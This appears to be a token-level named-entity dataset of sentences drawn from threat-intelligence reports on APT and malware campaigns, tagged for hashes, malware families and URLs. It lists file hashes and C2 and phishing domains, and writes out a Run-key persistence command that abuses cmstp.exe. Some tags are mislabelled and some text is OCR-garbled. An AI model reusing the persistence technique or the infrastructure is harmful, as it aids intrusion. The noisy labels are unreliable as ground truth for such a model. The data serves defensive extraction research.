unique	O
key	O
,	O
making	O
it	O
impossible	O
to	O
decrypt	O
unless	O
the	O
DLL	O
is	O
available	O
.	O

Description	O
:	O
Microsoft	O
NTLM	O
Service	O
Holder	O

\\	O
-	O
If	O
unlabeled	O
textbox1	O
starts	O
with	O
\\	O
,	O
use	O
xp_cmdshell	O
to	O
execute	O
the	O
copy	O
command	O
to	O
copy	O
file	O
to	O
%	O
windir%\Temp\temp.bin	O
.	O

It	O
registers	O
the	O
service	O
using	O
the	O
RegisterServiceCtrlHandler	O
Windows	O
API	O
function	O
.	O

The	O
malware	O
has	O
a	O
remote	O
controlling	O
function	O
,	O
and	O
attackers	O
sending	O
these	O
emails	O
seem	O
to	O
attempt	O
intruding	O
into	O
the	O
targets	O
'	O
network	O
using	O
the	O
malware	O
.	O

MD5	O
hash	O
:	O
1befa2c2d1bfc8e87d52871c868f75fe	B-hash

Saavedra-Morales	O
.	O

2.2	O
.	O

The	O
targeted	O
attacks	O
that	O
we	O
analyzed	O
were	O
heavily	O
concentrated	O
in	O
Asia	O
,	O
particularly	O
Taiwan	O
and	O
Japan	O
.	O

While	O
there	O
are	O
some	O
legitimate	O
instances	O
of	O
dynamic	O
DNS	O
in	O
corporate	O
environments	O
,	O
it	O
only	O
accounts	O
for	O
a	O
small	O
percentage	O
of	O
traffic	O
.	O

Meanwhile	O
,	O
it	O
's	O
more	O
difficult	O
for	O
us	O
to	O
tracing	O
when	O
facing	O
such	O
modeled	O
attack	O
.	O

These	O
particular	O
detections	O
are	O
interesting	O
because	O
they	O
indicate	O
an	O
attempted	O
selective	O
2nd	O
stage	O
deployment	O
of	O
a	O
backdoor	O
maintaining	O
filestealer	B-malware.infosteal
,	O
keylogger	B-malware.infosteal
,	O
and	O
remoteshell	B-malware.backdoor
functionality	O
to	O
a	O
system	O
of	O
interest	O
.	O

The	O
laptops	O
were	O
wiped	O
,	O
had	O
the	O
operating	O
system	O
installed	O
,	O
and	O
then	O
had	O
the	O
Shamoon	B-malware.unknown
malware	O
executed	O
on	O
the	O
system	O
.	O

winrar[.]be	B-url.normal
StrongPity	O
component	O
geolocation	O
distribution	O

The	O
malicious	O
macro	O
scans	O
the	O
victim	O
's	O
Outlook	O
inbox	O
and	O
looks	O
for	O
the	O
strings	O
'	O
$	O
$	O
cpte	O
'	O
and	O
'	O
$	O
$	O
ecpte'.2	O
.	O

Sqlmap	O
—	O
an	O
open-source	O
penetration	O
testing	O
tool	O
,	O
which	O
automates	O
the	O
process	O
of	O
identifying	O
and	O
exploiting	O
SQL	O
injection	O
vulnerabilities	O
and	O
taking	O
over	O
database	O
servers	O
.	O

Figure	O
7	O
-	O
Piece	O
of	O
decompiled	O
code	O

One	O
byte	O
of	O
key	O
string	O
is	O
used	O
per	O
iteration	O
,	O
and	O
whenever	O
the	O
key	O
string	O
is	O
'	O
used	O
up	O
'	O
,	O
it	O
restarts	O
again	O
at	O
the	O
beginning	O
of	O
the	O
key	O
;	O
register	O
EDI	O
holds	O
the	O
length	O
of	O
the	O
key	O
string	O
,	O
so	O
the	O
bot	O
just	O
computes	O
k	O

The	O
method	O
of	O
communication	O
,	O
as	O
well	O
as	O
the	O
address	O
to	O
connect	O
to	O
,	O
are	O
specified	O
in	O
CozyDuke	B-malware.drop
's	O
configuration	O
data	O
.	O

[	O
HKEY_CLASSES_ROOT\CLSID\	O
{	O
fbeb8a05-beee-4442-804e-409d6c4515e9	O
}	O
\	O
InProcServer32	O
]	O
@	O
=	O
'	O
%	O
Temp%\MSSoap.DLL	O
'	O

FireEye	O
observed	O
APT12	O
deliver	O
these	O
exploit	O
documents	O
via	O
phishing	O
emails	O
in	O
multiple	O
cases	O
.	O

Three	O
of	O
the	O
four	O
functions	O
are	O
empty	O
.	O

(	O
For	O
example	O
:	O
6fa869f17b703a1282b8f386d0d87bd4	B-hash
)	O
malware	O
that	O
collects	O
information	O
about	O
the	O
system	O
and	O
can	O
download	O
and	O
execute	O
other	O
files	O
.	O

For	O
example	O
,	O
one	O
sent	O
out	O
to	O
a	O
handful	O
of	O
countries	O
identifies	O
network	O
drives	O
when	O
they	O
are	O
added	O
to	O
target	O
systems	O
,	O
and	O
then	O
RC4-like-encrypts	O
and	O
writes	O
certain	O
file	O
metadata	O
and	O
contents	O
to	O
a	O
local	O
path	O
for	O
later	O
exfiltration	O
.	O

A	O
full	O
on-demand	O
scan	O
must	O
run	O
to	O
completely	O
clean	O
an	O
infected	O
host	O
.	O

In	O
the	O
context	O
of	O
this	O
attack	O
,	O
OutExtra.exe	O
is	O
a	O
signed	O
legitimate	O
application	O
;	O
however	O
,	O
it	O
is	O
tricked	O
into	O
loading	O
a	O
malware	O
file	O
that	O
is	O
disguised	O
as	O
the	O
legitimate	O
Outllib.dll	O
file	O
.	O

All	O
sensor	O
configurations	O
are	O
capable	O
of	O
detecting	O
the	O
initial	O
infection	O
and	O
the	O
command	O
and	O
control	O
communication	O
,	O
and	O
the	O
Fidelis	O
XPS	O
Internal	O
Sensor	O
is	O
required	O
for	O
detecting	O
the	O
lateral	O
movement	O
of	O
the	O
malicious	O
program	O
.	O

Taking	O
a	O
closer	O
look	O
at	O
the	O
Blog	O
page	O
the	O
following	O
post	O
is	O
observed	O
:	O
The	O
primary	O
string	O
to	O
focus	O
on	O
is	O
in	O
the	O
title	O
of	O
the	O
post	O
:	O

Since	O
ZxShell	B-malware.backdoor
has	O
been	O
around	O
since	O
at	O
least	O
2004	O
,	O
numerous	O
people	O
have	O
purchased	O
or	O
obtained	O
the	O
tools	O
necessary	O
to	O
set	O
up	O
ZxShell	B-malware.backdoor
command	O
and	O
control	O
servers	O
(	O
C	O
&	O
C	O
)	O
and	O
generate	O
the	O
malware	O
that	O
is	O
placed	O
on	O
the	O
victim	O
's	O
network	O
.	O

The	O
next	O
CozyDuke	B-malware.drop
main	O
component	O
we	O
observed	O
,	O
compiled	O
on	O
the	O
2	O
of	O
July	O
,	O
2014	O
,	O
is	O
again	O
a	O
DLL	O
file	O
.	O

#	O
KCMDDC4	O
#	O
-890	O
#	O
KCMDDC42F	O
#	O
-890	O

Similarities	O
between	O
the	O
Ethiopian	O
sample	O
and	O
those	O
used	O
to	O
target	O
Bahraini	O
activists	O
also	O
bring	O
into	O
question	O
Gamma	O
International	O
's	O
earlier	O
claims	O
that	O
the	O
Bahrain	O
samples	O
were	O
stolen	O
demonstration	O
copies	O
.	O

The	O
same	O
block	O
of	O
16	O
addresses	O
also	O
contains	O
the	O
website	O
http://qhotels.gov.qa/	O
.	O

June	O
2016	O

Over	O
the	O
past	O
two	O
years	O
,	O
Russia	O
appears	O
to	O
have	O
increasingly	O
leveraged	O
APT28	B-malware.infosteal
to	O
conduct	O
information	O
operations	O
commensurate	O
with	O
broader	O
strategic	O
military	O
doctrine	O
.	O

Figure	O
3	O
:	O
DUBNIUM	B-malware.drop
functions	O
list	O

Of	O
course	O
,	O
it	O
should	O
be	O
possible	O
to	O
reconfigure	O
the	O
malware	O
to	O
use	O
any	O
Cloud-based	O
storage	O
service	O
that	O
supports	O
WebDAV	O
.	O

First	O
Name	O
*	O
Last	O
Name	O
*	O

The	O
summary	O
above	O
is	O
just	O
our	O
view	O
of	O
the	O
overlaps	O
in	O
web	O
based	O
tools/exploits	O
and	O
targets	O
between	O
different	O
threat	O
actors	O
,	O
but	O
those	O
with	O
different	O
datasets	O
may	O
be	O
able	O
to	O
draw	O
different	O
conclusions	O
.	O

If	O
the	O
response	O
contains	O
:	O
'	O
VMware	O
'	O
,	O
'	O
Virtual	O
'	O
,	O
'	O
XEN	O
'	O
,	O
'	O
Xen	O
'	O
or	O
'	O
AMI	O
'	O
the	O
system	O
is	O
considered	O
as	O
a	O
virtual	O
machine	O
.	O

net	O
start	O
–	O
starts	O
any	O
of	O
the	O
various	O
services	O
that	O
are	O
running	O

The	O
main	O
exploit	O
page	O
script	O
contains	O
a	O
BASE64	O
decoder	O
,	O
as	O
well	O
as	O
rc4	O
decryption	O
implemented	O
in	O
JS	O
.	O

The	O
tool	O
offers	O
a	O
range	O
of	O
options	O
to	O
the	O
attacker	O
,	O
from	O
keylogging	O
and	O
remote	O
activation	O
of	O
the	O
webcam	O
to	O
file	O
exfiltration	O
.	O

getFirefoxPassword	O

This	O
was	O
the	O
only	O
sample	O
bearing	O
the	O
Viking	B-malware.drop
virus	O
.	O

sandbox\WINDOWS\system32\kernel32.dll	O
-	O
Avast	O
!	O

is	O
turned	O
on	O
or	O
monitored	O
for	O
identification	O
of	O
security	O
issues	O
.	O

The	O
RAT	B-malware.backdoor
Installer	O
is	O
XOR'ed	O
six	O
bytes	O
at	O
a	O
time	O
and	O
the	O
Cisco	O
decoy	O
is	O
XOR'ed	O
four	O
bytes	O
at	O
a	O
time	O
.	O

The	O
service	O
's	O
existence	O
is	O
verified	O
with	O
the	O
ServiceExists	O
function	O
,	O
which	O
attempts	O
to	O
open	O
the	O
relative	O
registry	O
sub-key	O
in	O
HKLM\SYSTEM\CurrentControlSet\Services	O
.	O

The	O
keylogger	O
is	O
based	O
on	O
the	O
raw	O
input	O
model	O
.	O

The	O
file	O
rtniczw.sys	O
was	O
signed	O
on	O
18	O
March	O
2010	O
,	O
but	O
on	O
14	O
April	O
2010	O
the	O
Stuxnet	B-malware.backdoor
authors	O
created	O
a	O
new	O
variant	O
of	O
the	O
worm	O
that	O
made	O
use	O
of	O
the	O
'	O
reference	O
'	O
mrxcls.sys	O
.	O

refused	O
,	O
but	O
when	O
demurred	O
and	O
gave	O
an	O
online	O
cold	O
shoulder	O
,	O
tried	O
installing	O
Tweety	B-malware.backdoor
Chat	I-malware.backdoor
—	O
and	O
failed	O
.	O

A	O
consultant	O
at	O
West	O
Bank	O
and	O
Gaza	O
Group	O
,	O
The	O
World	O
Bank	O
(	O
worldbank.org	O
)	O
.	O

Table	O
1	O
.	O

The	O
top	O
countries	O
directed	O
to	O
StrongPity	O
malware	O
from	O
the	O
winrar.be	B-url.normal
site	O
from	O
May	O
25th	O
through	O
the	O
first	O
few	O
days	O
of	O
June	O
are	O
Belgium	O
,	O
Algeria	O
,	O
Morroco	O
,	O
Netherlands	O
,	O
Canada	O
,	O
Cote	O
D'Ivoire	O
,	O
and	O
Tunisia	O
.	O

Over	O
the	O
years	O
,	O
the	O
group	O
was	O
observed	O
attacking	O
a	O
wide	O
spectrum	O
of	O
targets	O
in	O
other	O
Asian	O
countries	O
(	O
Philippines	O
and	O
Vietnam	O
)	O
.	O

Tele	O
:	O
2619	O
4428	O

T	O
hese	O
events	O
suggest	O
that	O
the	O
data	O
center	O
infected	O
with	O
HyperBro	B-malware.backdoor
and	O
the	O
waterholing	O
campaign	O
are	O
connected	O
.	O

EXECPROGAM	O
calls	O
ShellExecute	O
to	O
run	O
the	O
application	O
given	O
in	O
the	O
command	O
.	O

However	O
because	O
of	O
the	O
way	O
the	O
malware	O
operates	O
and	O
how	O
it	O
is	O
programmed	O
to	O
wipe	O
,	O
it	O
can	O
find	O
itself	O
being	O
its	O
own	O
enemy	O
.	O

Other	O
malware	O
families	O
that	O
use	O
this	O
vulnerability	O
typically	O
target	O
executable	O
files	O
outside	O
of	O
Windows	O
;	O
EvilGrab	B-malware.drop
targets	O
a	O
part	O
of	O
Windows	O
itself	O
.	O

Parsing	O
these	O
files	O
reveals	O
a	O
URL	O
embedded	O
in	O
the	O
the	O
file	O
(	O
bolded	O
below	O
)	O
.	O

Fake	O
FB	O
profiles	O
:	O

This	O
conjecture	O
is	O
confirmed	O
upon	O
inspection	O
of	O
the	O
remaining	O
portion	O
of	O
the	O
loop	O
,	O
which	O
applies	O
the	O
same	O
ASCII-to-hex	O
operation	O
on	O
the	O
second	O
byte	O
of	O
each	O
pair	O
of	O
source	O
bytes	O
,	O
and	O
adds	O
the	O
result	O
to	O
the	O
left-shifted	O
output	O
from	O
the	O
first	O
byte	O
of	O
the	O
pair	O
.	O

tool	O
bulletin	O
vulnerabilities	O
wifi	O

Initial	O
encrypted	O
dropper	O
download	O
.	O

The	O
original	O
Outllib.dll	O
has	O
a	O
file	O
size	O
range	O
of	O
4-8	O
MB	O
,	O
depending	O
on	O
the	O
version	O
,	O
but	O
the	O
fake	O
file	O
only	O
ranges	O
from	O
40-50	O
KB	O
.	O

The	O
code	O
used	O
in	O
the	O
stub	O
modules	O
for	O
these	O
drivers	O
is	O
identical	O
,	O
but	O
has	O
different	O
compilation	O
dates	O
.	O

It	O
is	O
almost	O
superfluous	O
to	O
mention	O
that	O
in	O
order	O
to	O
give	O
the	O
file	O
a	O
legitimate	O
look	O
,	O
the	O
developers	O
pinned	O
it	O
to	O
a	O
Word	O
icon	O
and	O
called	O
it	O
'	O
'	O
(	O
Monthly	O
Press	O
Report	O
)	O
.	O

This	O
evidence	O
appears	O
to	O
be	O
consistent	O
with	O
the	O
theory	O
that	O
the	O
dissidents	O
in	O
Bahrain	O
who	O
received	O
these	O
e-mails	O
were	O
targeted	O
with	O
the	O
FinSpy	B-malware.infosteal
tool	O
,	O
configured	O
to	O
exfiltrate	O
their	O
harvested	O
information	O
to	O
servers	O
in	O
Bahraini	O
IP	O
space	O
.	O

A	O
log	O
of	O
visits	O
to	O
the	O
site	O
directory	O
records	O
that	O
the	O
directory	O
was	O
set	O
up	O
on	O
July	O
8th	O
.	O

It	O
looks	O
like	O
attackers	O
carefully	O
researched	O
(	O
or	O
they	O
already	O
knew	O
about	O
)	O
the	O
trust	O
relationship	O
between	O
these	O
two	O
companies	O
.	O

Five	O
of	O
the	O
individuals	O
also	O
had	O
a	O
hillaryclinton.com	B-url.normal
email	O
account	O
that	O
was	O
targeted	O
by	O
TG-4127	B-malware.infosteal
.	O

e9580b6b13822090db018c320e80865f	O
-	O
Pfinet	O
backdoor	O
071d3b60ebec2095165b6879e41211f2	O
-	O
Pfinet	O
backdoor	O

http://vil.nai.com/vil/content/v_253415.htm	B-url.unknown
This	O
Trojan	O
is	O
dropped	O
by	O
the	O
roarur.dr	O
Trojan	O
.	O

6	O
같은	O
해	O
12월에는	O
또	O
다른	O
여행	O
사	O
해킹이	O
확인되었다	O
.	O

The	O
attributes	O
are	O
dynamically	O
generated	O
or	O
requested	O
at	O
runtime	O
and	O
not	O
stored	O
in	O
memory	O
.	O

Their	O
victims	O
have	O
been	O
identified	O
in	O
the	O
United	O
States	O
,	O
Western	O
Europe	O
,	O
Brazil	O
,	O
Canada	O
,	O
China	O
,	O
Georgia	O
,	O
Iran	O
,	O
Japan	O
,	O
Malaysia	O
and	O
South	O
Korea	O
.	O

Each	O
module	O
has	O
a	O
unique	O
extension	O
which	O
is	O
the	O
client	O
ID	O
.	O

A	O
number	O
of	O
the	O
samples	O
were	O
signed	O
using	O
the	O
leaked	O
code-signing	O
certificate	O
from	O
the	O
Hacking	O
Team	O
breach	O
.	O

From	O
2016	O
through	O
2017	O
,	O
two	O
subsidiaries	O
of	O
U.S.	O
and	O
Philippine	O
consumer	O
products	O
corporations	O
,	O
located	O
inside	O
Vietnam	O
,	O
were	O
the	O
target	O
of	O
APT32	O
intrusion	O
operations	O
.	O

Started	O
in	O
2012	O
and	O
staffed	O
almost	O
entirely	O
by	O
former	O
United	O
States	O
Department	O
of	O
Defense	O
civilians	O
and	O
military	O
cyber-warriors	O
,	O
root9B	O
brings	O
a	O
unique	O
base	O
of	O
knowledge	O
and	O
experience	O
to	O
the	O
task	O
of	O
securing	O
corporate	O
networks	O
.	O

The	O
following	O
reflects	O
observations	O
during	O
field	O
unit	O
execution	O
from	O
an	O
infected	O
external	O
drive	O
:	O
The	O
malware	O
attempts	O
to	O
ensure	O
errors	O
are	O
suppressed	O
and	O
not	O
observed	O
by	O
a	O
user	O
The	O
malware	O
performs	O
specific	O
environment	O
checking	O
to	O
adapt	O
to	O
Windows	O
versions	O
from	O
at	O
least	O
Windows	O
2000	O
to	O
Windows7/Server	O
2008	O
and	O
up	O
The	O
malware	O
terminates	O
if	O
it	O
detects	O
another	O
iteration	O
of	O
itself	O
via	O
the	O
Mutex	O
The	O
malware	O
terminates	O
if	O
any	O
Gateway	O
IPs	O
associated	O
with	O
the	O
resident	O
system	O
are	O
'	O
Mtx_Sp_on_PC_1_2_8	O
'	O
in	O
the	O
10.x.x.x	B-ip.unknown
range	O
The	O
malware	O
copies	O
itself	O
to	O
<	O
CSIDL_LOCAL_APPDATA	O
>	O
\Microsoft\Windows\Help\update.exe	O
The	O
malware	O
runs	O
update.exe	O
with	O
the	O
parameters	O
'	O
-wu	O
external	O
drive	O
letter	O
'	O
,	O
e.g.	O
,	O
z	O
:	O
,	O
with	O
the	O
temporary	O
directory	O
specified	O
for	O
the	O
working	O
directory	O
The	O
malware	O
copies	O
a	O
file	O
named	O
~disk.ini	O
from	O
the	O
infected	O
drive	O
to	O
<	O
CSIDL_LOCAL_APPDATA	O
>	O
\Microsoft\Windows\Help\intr	O
The	O
malware	O
checks	O
the	O
system	O
date	O
against	O
31	O
May	O
2013	O
;	O
if	O
on	O
or	O
after	O
,	O
the	O
malware	O
terminates	O
The	O
malware	O
copies	O
<	O
CSIDL_LOCAL_APPDATA	O
>	O
\Microsoft\Windows\Help\intr	O
to	O
<	O
CSIDL_LOCAL_APPDATA	O
>	O
\Microsoft\Windows\Chars\intr	O

In	O
Belgium	O
,	O
the	O
attackers	O
placed	O
a	O
'	O
recommended	O
'	O
link	O
to	O
their	O
ralrab[.]com	B-url.normal
site	O
in	O
the	O
middle	O
of	O
the	O
localized	O
WinRAR	O
distribution	O
page	O
on	O
winrar[.]be	O
.	O

29	O
Dec	O
.	O

A	O
quick	O
response	O
was	O
top	O
priority	O
,	O
so	O
time	O
and	O
planning	O
were	O
forgone	O
luxuries	O
for	O
the	O
Iranian	O
government	O
.	O

Threat	O
Intelligence	O

Our	O
assumption	O
is	O
guided	O
by	O
hard	O
evidence	O
included	O
in	O
the	O
binary	O
.	O

FireEye	O
has	O
identified	O
six	O
IRONGATE	B-malware.drop
droppers	O
:	O
bla.exe	B-malware.drop
,	O
update.exe	B-malware.drop
update_no_pipe.exe	B-malware.drop
,	O
update.exe	B-malware.drop
.	O

This	O
process	O
revealed	O
a	O
series	O
of	O
campaigns	O
with	O
highly­regionalized	O
malware	O
practices	O
and	O
geographically­skewed	O
victim	O
tasking	O
,	O
unsurprising	O
in	O
a	O
region	O
with	O
a	O
gradually­maturing	O
cybercrime	O
industry	O
.	O

McAfee	O
Vulnerability	O
Coverage	O
not	O
warranted	O
MNAC	O
2.x	O
Coverage	O
not	O
warranted	O
McAfee	O
Remediation	O
Malware	O
coverage	O
is	O
out	O
of	O
scope	O
.	O

Figure	O
3	O
:	O
Triconex	B-malware.unknown
Key	O
Switch	O
(	O
source	O
)	O
Figure	O
4	O
:	O
TRITON	B-malware.infosteal
Architecture	O
and	O
Attack	O
Scenario	O
TRITON	B-malware.infosteal
was	O
deployed	O
on	O
an	O
SIS	O
engineering	O
workstation	O
running	O
the	O
Microsoft	O
Windows	O
operating	O
system	O
.	O

postMessageThread	O
]	O

We	O
noted	O
that	O
this	O
might	O
signify	O
the	O
release	O
of	O
a	O
future	O
variant	O
.	O

RamFS	O
content	O
is	O
initially	O
stored	O
encrypted	O
in	O
Dino	B-malware.backdoor
's	O
configuration	O
under	O
the	O
key	O
'	O
xT0rvwz	O
'	O
,	O
whereas	O
the	O
corresponding	O
RC4	O
key	O
is	O
stored	O
under	O
the	O
key	O
'	O
tr4qa589	O
'	O
.	O

Malware	O
is	O
the	O
single	O
greatest	O
problem	O
in	O
computer	O
security	O
today	O
.	O

9	O
.	O

On	O
March	O
20	O
,	O
2013	O
a	O
cyber	O
attack	O
now	O
known	O
as	O
Dark	O
Seoul	O
,	O
paralyzed	O
several	O
major	O
banking	O
services	O
and	O
broadcasters	O
in	O
South	O
Korea	O
.	O

The	O
attackers	O
'	O
aim	O
was	O
to	O
compromise	O
PoS	O
servers	O
used	O
in	O
payment	O
processing	O
.	O

And	O
,	O
TrueCrypt	O
provides	O
an	O
effective	O
open-source	O
full	O
disk	O
encryption	O
solution	O
for	O
Windows	O
,	O
Apple	O
,	O
Linux	O
,	O
and	O
Android	O
systems	O
.	O

Believing	O
that	O
they	O
are	O
opening	O
a	O
harmless	O
'	O
.jpg	O
'	O
,	O
victims	O
are	O
instead	O
tricked	O
into	O
running	O
an	O
executable	O
'	O
.exe	O
'	O
file	O
.	O

In	O
the	O
first	O
wave	O
of	O
attack	O
,	O
The	O
attackers	O
sent	O
out	O
spear-phishing	O
emails	O
containing	O
malicious	O
excel	O
file	O
(	O
Case	O
Detail	O
of	O
Suspected	O
abuser.xls	O
)	O
to	O
an	O
unit	O
of	O
Central	O
Bureau	O
of	O
Investigation	O
(	O
CBI	O
)	O
on	O
February	O
21st	O
,	O
2017	O
and	O
the	O
email	O
was	O
sent	O
from	O
an	O
email	O
id	O
associated	O
with	O
an	O
impersonating	O
domain	O
idsadesk[.]in	B-url.unknown
.	O

In	O
our	O
sample	O
set	O
,	O
we	O
have	O
28	O
malware	O
samples	O
that	O
connect	O
to	O
a	O
set	O
of	O
sequentially	O
numbered	O
command	O
and	O
control	O
servers	O
:	O
uranio.no-ip.biz	O
uranio2.no-ip.biz	O
uranio3.no-ip.biz	O
uranio4.no-ip.biz	O
uranio5.no-ip.biz	O
uranio6.no-ip.biz	O
uranio7.no-ip.biz	O
platino.no-ip.biz	O
platino-2.no-ip.biz	O
platino-4.no-ip.biz	O
platino-5.no-ip.biz	O
platino-8.no-ip.biz	O
platino-9.no-ip.biz	O
cometa3.no-ip.biz	O
cometa4.no-ip.biz	O
The	O
malware	O
is	O
being	O
spammed	O
out	O
and	O
has	O
file	O
names	O
such	O
as	O
:	O
Certificaciones	B-malware.drop
De	I-malware.drop
Pagos	I-malware.drop
Nominas	I-malware.drop
Parafiscales	I-malware.drop
jpg	I-malware.drop
125420215	I-malware.drop
58644745574455	I-malware.drop
.exe	I-malware.drop
Soportes	B-malware.drop
de	I-malware.drop
pagos	I-malware.drop
certificaciones	I-malware.drop
y	I-malware.drop
documentos	I-malware.drop
mes	I-malware.drop
mayo	I-malware.drop
30	I-malware.drop
2013	I-malware.drop
567888885432235678888888123456.exe	I-malware.drop
Certificaciones	B-malware.drop
De	I-malware.drop
Pago	I-malware.drop
Y	I-malware.drop
Para	I-malware.drop
Fiscales.exe	I-malware.drop
We	O
extracted	O
the	O
configurations	O
for	O
a	O
sampling	O
of	O
the	O
XtremeRAT	B-malware.backdoor
samples	O
we	O
came	O
across	O
in	O
this	O
spam	O
run	O
and	O
found	O
the	O
following	O
results	O
:	O

It	O
contains	O
a	O
list	O
of	O
three	O
system	O
language	O
codes	O
:	O
0x0419	O
(	O
Russian	O
)	O
,	O
0x0422	O
(	O
Ukrainian	O
)	O
,	O
and	O
0x0423	O
(	O
Belarusian	O
)	O
.	O

Throughout	O
October	O
and	O
into	O
early	O
November	O
,	O
WikiLeaks	O
published	O
34	O
batches	O
of	O
email	O
correspondence	O
stolen	O
from	O
John	O
Podesta	O
's	O
personal	O
email	O
account	O
.	O

Sectors	O
targeted	O
included	O
airlines	O
;	O
aircraft	O
services	O
;	O
software	O
and	O
IT	O
services	O
companies	O
serving	O
the	O
air	O
and	O
sea	O
transport	O
sectors	O
;	O
telecoms	O
services	O
;	O
payroll	O
services	O
;	O
engineering	O
consultancies	O
;	O
and	O
document	O
management	O
software	O
.	O

The	O
developers	O
named	O
this	O
file	O
the	O
'	O
cleaner	O
'	O
and	O
it	O
is	O
executed	O
when	O
Dino	B-malware.backdoor
receives	O
the	O
command	O
'	O
killBD	O
'	O
(	O
the	O
'	O
BD	O
'	O
acronym	O
is	O
the	O
developers	O
'	O
designation	O
of	O
the	O
malware	O
)	O
.	O

When	O
opened	O
,	O
they	O
downloaded	O
a	O
malicious	O
VBS	O
 le	O
that	O
in	O
turn	O
ran	O
a	O
PowerShell	O
script	O
.	O

Powershell	O
version	O
of	O
credential	O
theft	O
tool	O
MimiKatz	B-malware.infosteal
was	O
also	O
used	O
by	O
the	O
actors	O
to	O
facilitate	O
credential	O
acquisition	O
for	O
lateral	O
movement	O
purposes	O
.	O

Uses	O
the	O
'	O
checkFolders	O
'	O
function	O
within	O
the	O
ScanBox	B-malware.infosteal
code	O
,	O
rather	O
than	O
explicitly	O
checking	O
for	O
files	O
;	O
and	O
,	O
Hosts	O
the	O
ScanBox	B-malware.infosteal
code	O
on	O
the	O
same	O
page	O
they	O
have	O
compromised	O
rather	O
than	O
on	O
a	O
3	O
party	O
IP	O
address	O
or	O
domain	O
name	O
owned	O
by	O
the	O
attacker	O
.	O

Figure	O
2	O
-	O
POST	O
traffic	O
sniffed	O

Ene	O
r	O
ge	O
t	O
ic	O
Be	O
ar	O
/Cr	O
o	O
uching	O
Ye	O
t	O
i	O
:	O
at	O
t	O
acks	O
o	O
n	O
se	O
r	O
ve	O
r	O
s	O
Ene	O
r	O
ge	O
t	O
ic	O
Be	O
ar	O
/Cr	O
o	O
uching	O
Ye	O
t	O
i	O
:	O
at	O
t	O
acks	O
o	O
n	O
se	O
r	O
ve	O
r	O
s	O

The	O
Moafee	B-malware.infosteal
campaign	O
can	O
be	O
traced	O
to	O
infrastructure	O
located	O
in	O
the	O
Guangdong	O
province	O
,	O
whereas	O
the	O
DragonOK	B-malware.infosteal
campaign	O
can	O
be	O
traced	O
to	O
infrastructure	O
located	O
in	O
the	O
Jiangsu	O
province	O
.	O

Customize.aspx	B-url.unknown
8aa603ee2454da64f4c70f24cc0b5e08	B-hash
Customize.cfm	B-url.unknown
ad8288227240477a95fb023551773c84	B-hash
Customize.jsp	B-url.unknown
acba8115d027529763ea5c7ed6621499	B-hash

Using	O
Cobalt	O
Strike	O
attack	O
can	O
execute	O
various	O
operations	O
in	O
the	O
targeted	O
systems	O
,	O
such	O
as	O
downloading	O
and	O
uploading	O
files	O
,	O
executing	O
designated	O
programs	O
,	O
injecting	O
keyboard	O
recorder	O
,	O
executing	O
commands	O
via	O
PowerShell	O
,	O
importing	O
PowerShell	O
script	O
,	O
executing	O
commands	O
via	O
CMD	O
,	O
accessing	O
system	O
passwords	O
and	O
so	O
on	O
.	O

The	O
exploitation	O
process	O
consists	O
of	O
three	O
Flash	O
objects	O
.	O

sysinfo	O
killBD	O
conf	O
search	O
archive	O
unarchive	O
download	O
cancel	O
cancelall	O
cronadd	O
cronlist	O
crondel	O
wakeup	O
restart	O
showip	O
cominfos	O
comallinfos	O
wget	O

While	O
the	O
available	O
options	O
differ	O
depending	O
on	O
what	O
platform	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
is	O
running	O
on	O
,	O
the	O
file	O
management	O
features	O
in	O
Linux	O
(	O
see	O
Figure	O
20	O
)	O
are	O
similar	O
to	O
those	O
in	O
Windows	O
.	O

After	O
dropping	O
the	O
three	O
files	O
,	O
the	O
macro	O
will	O
set	O
the	O
following	O
registry	O
key	O
to	O
achieve	O
persistence	O
:	O
\REGISTRY\USER\SID\Software\Microsoft\Windows\CurrentVersio	O
n\Run\'WindowsDefenderUpdater	O
'	O
=	O
cmstp.exe	O
/s	O
c:\programdata\DefenderService.inf	O
Upon	O
system	O
restart	O
,	O
cmstp.exe	O
will	O
be	O
used	O
to	O
execute	O
the	O
SCT	O
file	O
indirectly	O
through	O
the	O
INF	O
file	O
.	O

8/19/16	O
wchildress(.)com	B-url.unknown
abellonav.poulsen(at)yandex.com	B-url.unknown
8/19/16	O
poulsenv(.)com	B-url.unknown
abellonav.poulsen(at)yandex.com	B-url.unknown
8/19/16	O
toshste(.)com	B-url.unknown
toshsteffensen2(at)yandex.com	B-url.unknown
9/6/16	O
shenajou(.)com	B-url.unknown
ShenaJouellette(at)india.com	B-url.unknown
9/6/16	O
ixrayeye(.)com	B-url.unknown
BettyWBatts(at)india.com	B-url.unknown
9/12/16	O
wthelpdesk(.)com	B-url.unknown
ArmandOValcala(at)india.com	B-url.unknown
9/12/16	O
bdoncloud(.)com	B-url.unknown
GloriaRPaige(at)india.com	B-url.unknown
9/12/16	O
belowto(.)com	B-url.unknown
RobertoRivera(at)india.com	B-url.unknown
11/3/16	O
incloud-go(.)com	B-url.unknown
RufinaRWebb(at)india.com	B-url.unknown
11/3/16	O
unhamj(.)com	B-url.unknown
JuanitaRDunham(at)india.com	B-url.unknown
11/3/16	O
cloud-maste(.)com	B-url.unknown
MeganFDelgado(at)india.com	B-url.unknown
11/4/16	O
cloud-kingl(.)com	B-url.unknown
ElisabethBGreen(at)india.com	B-url.unknown
11/4/16	O
incloud-obert(.)com	B-url.unknown
RobertJButler(at)india.com	B-url.unknown
12/6/16	O
fftpoor(.)com	B-url.unknown
SteveCBrown(at)india.com	B-url.unknown
12/6/16	O
ccfchrist(.)com	B-url.unknown
WenonaTMcMurray(at)india.com	B-url.unknown
12/7/16	O
catholicmmb(.)com	B-url.unknown
EmilyGLessard(at)india.com	B-url.unknown
12/7/16	O
usffunicef(.)com	B-url.unknown
MarisaKParr(at)india.com	B-url.unknown
12/7/16	O
cwiinatonal(.)com	B-url.unknown
RobertMKnight(at)india.com	B-url.unknown
12/7/16	O
tffghelth(.)com	B-url.unknown
NathanABecker(at)india.com	B-url.unknown
12/7/16	O
acsocietyy(.)com	B-url.unknown
PearlJBrown(at)india.com	B-url.unknown
12/8/16	O
tokyo-gojp(.)com	B-url.unknown
VeraTPerkins(at)india.com	B-url.unknown
12/8/16	O
salvaiona(.)com	B-url.unknown
DeborahAStutler(at)india.com	B-url.unknown
12/8/16	O
osaka-jpgo(.)com	B-url.unknown
JudithAMartel(at)india.com	B-url.unknown
12/8/16	O
tyoto-go-jp(.)com	B-url.unknown
AletaFNowak(at)india.com	B-url.unknown
12/8/16	O
fastmail2(.)com	B-url.unknown
ClementBCarico(at)india.com	B-url.unknown
12/11/16	O
wcwname(.)com	B-url.unknown
